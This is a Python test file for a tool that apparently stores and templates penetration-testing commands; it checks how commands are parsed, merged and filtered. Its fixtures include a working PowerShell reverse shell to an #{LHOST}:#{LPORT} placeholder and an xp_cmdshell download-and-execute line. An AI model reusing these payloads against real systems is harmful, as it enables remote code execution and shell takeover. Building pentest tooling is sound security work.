import re
from cmder.command import Command, CommandList, SplitLine
from cmder.variable import VariableList


class TestCommand():

    def test_base(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.cmd == 'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth'

    def test_add_cmd(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        assert len(cmd.cmd) == 1
        cmd.add_cmd("select IS_SRVROLEMEMBER('sysadmin')")
        assert len(cmd.cmd) == 2

    def test_add_note(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.add_note('desc: this is description')
        cmd.add_note('refer: this is refer')
        cmd.add_note('refer: this is refer 2')
        cmd.add_note('link: this is link')
        cmd.add_note('link: this is link 2')
        cmd.add_note('this is note')
        cmd.add_note('this is note 2')

        assert len(cmd.notes) == 2
        assert len(cmd.refer) == 2
        assert len(cmd.links) == 2
        assert cmd.desc == 'this is description'
        assert cmd.refer[0] == 'this is refer'
        assert cmd.links[0] == 'this is link'
        assert cmd.notes[0] == 'this is note'

    def test_add_refer(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.add_refer('https://book.hacktricks.xyz/pentesting')
        assert len(cmd.refer) == 1
        assert cmd.refer[0] == 'https://book.hacktricks.xyz/pentesting'

    def test_add_link(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.add_link('pentesting/recon/dns_lookup')
        assert len(cmd.links) == 1
        assert cmd.links[0] == 'pentesting/recon/dns_lookup'

    def test_parse(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.parse()
        assert len(cmd.vars) == 3
        assert str(cmd.vars.list.keys()
                   ) == "odict_keys(['DOMAIN', 'USER', 'RHOST'])"

        cmd.add_cmd("host -t #{type} #{RHOST}")
        cmd.parse()
        assert len(cmd.vars) == 4
        assert str(cmd.vars.list.keys()
                   ) == "odict_keys(['DOMAIN', 'USER', 'RHOST', 'type'])"

    def test_to_shell(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.add_cmd("host -t #{type} #{RHOST}")
        shell = cmd.to_shell()
        assert shell == 'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth\nhost -t #{type} #{RHOST}'

        shell_one_line = cmd.to_shell(one_line=True)
        assert shell_one_line == 'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth;host -t #{type} #{RHOST}'

    def test_merge_var(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.parse()

        varlist = VariableList()
        varlist.set({'name': 'RHOST', 'func': 'desc', 'value': 'remote host'})
        varlist.set({'name': 'IP', 'func': 'desc', 'value': 'ip'})

        cmd.merge_var(varlist)

        assert len(cmd.vars) == 3
        assert cmd.vars['RHOST'].desc == 'remote host'
        assert 'IP' not in cmd.vars

    def test_merge_note(cls):
        cmd = Command(
            'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth')
        cmd.add_note('desc: this is description')
        cmd.add_note('refer: this is refer')
        cmd.add_note('refer: this is refer 2')
        cmd.add_note('link: this is link')
        cmd.add_note('link: this is link 2')
        cmd.add_note('this is note')
        cmd.add_note('this is note 2')

        notes = [
            'desc: this is merge description',
            'refer: this is merge refer',
            'link: this is merge link',
            'this is merge note'
        ]
        cmd.merge_notes(notes)
        assert len(cmd.notes) == 3
        assert len(cmd.links) == 3
        assert len(cmd.refer) == 3
        assert cmd.desc == 'this is merge description'
        assert cmd.notes[0] == 'this is merge note'
        # 只有 note 会翻转
        assert cmd.links[2] == 'this is merge link'
        assert cmd.refer[2] == 'this is merge refer'

    def test_path(cls):
        # TODO
        ...


class TestCommandList():

    def create_cmdlist(cls):
        cmdlist = CommandList()
        cmdlist.append(SplitLine('Sqlmap'))
        cmdlist.append(
            Command('mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth'))
        cmdlist.append(Command(
            """xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://#{LHOST}:#{LPORT}/#{file}\");"""""))
        cmdlist.append(Command(
            """$client = New-Object System.Net.Sockets.TCPClient("#{LHOST}",#{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""))
        return cmdlist

    def test_base(cls):
        cmdlist = cls.create_cmdlist()
        assert len(cmdlist) == 3

    def test_append(cls):
        cmdlist = CommandList()
        l = [
            Command(
                """$client = New-Object System.Net.Sockets.TCPClient("#{LHOST}",#{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""),
            Command(
                """mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth""")
        ]
        cmdlist.append(l)
        assert len(cmdlist) == 2

    def test_iter(cls):
        cmdlist = cls.create_cmdlist()
        for cmd in cmdlist:
            assert type(cmd) in [Command, SplitLine]

    def test_getitem(cls):
        cmdlist = cls.create_cmdlist()
        assert isinstance(cmdlist[0], Command)

    def test_get_cmd_list(cls):
        cmdlist = cls.create_cmdlist()
        cmds = cmdlist.get_cmd_list()
        for cmd in cmds:
            assert isinstance(cmd, Command)

    def test_filter(cls):
        cmdlist = cls.create_cmdlist()
        cmds = cmdlist.filter('mssqlclient.py')

        assert cmds[0].to_shell(
        ) == 'mssqlclient.py #{DOMAIN}/#{USER}@#{RHOST} -windows-auth'
        assert len(cmds) == 1


class TestSplitLine():

    def test_to_s(cls):
        ...
        sp = SplitLine('Sqlmap')
        string = sp.to_s()
        assert re.match(r'---.*Sqlmap.*---', string)
